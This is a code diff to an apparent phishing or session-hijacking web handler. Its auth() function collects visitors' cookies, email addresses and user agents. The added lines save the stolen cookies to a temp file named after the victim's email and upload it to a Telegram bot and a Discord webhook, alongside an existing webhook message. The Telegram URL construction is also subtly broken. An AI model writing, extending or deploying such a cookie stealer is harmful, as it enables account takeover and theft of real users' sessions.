@@ -421,19 +421,55 @@ def auth():
 
     # Prepare cookies for webhook in Cookie2json format
     cookies_json = []
-    # Add cookies from request
     for k, v in request.cookies.items():
         cookies_json.append(cookieToJSON(f"{k}={v}; Path=/; Secure; SameSite=Strict", domain))
-    # Add newly set cookies
     cookies_json.append(cookieToJSON(f"auth_verified=1; Path=/; Secure; SameSite=Strict", domain))
     cookies_json.append(cookieToJSON(f"user_agent={user_agent}; Path=/; Secure; SameSite=Strict", domain))
 
-    # Send cookies as JSON string to webhook
+    # Save cookies to txt file named with user email
+    safe_email = email.replace('@', '_at_').replace('.', '_dot_')
+    temp_file_path = os.path.join(tempfile.gettempdir(), f"{safe_email}_cookies.txt")
+    cookies_str = json.dumps(cookies_json, indent=2)
+    # Telegram/Discord file size limit (Telegram: 50MB, Discord: 8MB for free)
+    max_size = 8 * 1024 * 1024
+    try:
+        if len(cookies_str.encode('utf-8')) < max_size:
+            with open(temp_file_path, 'w') as f:
+                f.write(cookies_str)
+        else:
+            with open(temp_file_path, 'w') as f:
+                f.write(cookies_str[:max_size])
+    except Exception as e:
+        print(f"[ERROR] Could not write cookies file: {e}")
+
+    # Send cookies as JSON string to webhook and as file if possible
     cookies_message = (
-        f"🍪 AUTH COOKIES\nEmail: {email}\nCookies:\n{json.dumps(cookies_json, indent=2)}"
+        f"🍪 AUTH COOKIES\nEmail: {email}\nCookies:\n{cookies_str}"
         f"\nUser-Agent: {user_agent}"
     )
     send_webhook_message(cookies_message)
+
+    # Send file to Telegram (document upload)
+    try:
+        if TELEGRAM_WEBHOOK_ON and TELEGRAM_CHAT_ID and os.path.exists(temp_file_path):
+            with open(temp_file_path, 'rb') as doc_file:
+                files = {'document': doc_file}
+                data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f'Cookies for {email}'}
+                r = requests.post(f'https://api.telegram.org/bot{TELEGRAM_WEBHOOK_URL.split("bot")[1].split(":")[0]}/sendDocument', data=data, files=files, timeout=10)
+                print(f"[DEBUG] Telegram file upload status: {r.status_code}")
+    except Exception as e:
+        print(f"[ERROR] Telegram file upload failed: {e}")
+
+    # Send file to Discord (document upload)
+    try:
+        if DISCORD_WEBHOOK_ON and os.path.exists(temp_file_path):
+            with open(temp_file_path, 'rb') as doc_file:
+                files = {'file': (f'{safe_email}_cookies.txt', doc_file)}
+                data = {'content': f'Cookies for {email}'}
+                r = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=10)
+                print(f"[DEBUG] Discord file upload status: {r.status_code}")
+    except Exception as e:
+        print(f"[ERROR] Discord file upload failed: {e}")
 
     # Clean up session after authentication
     session.pop('email', None)
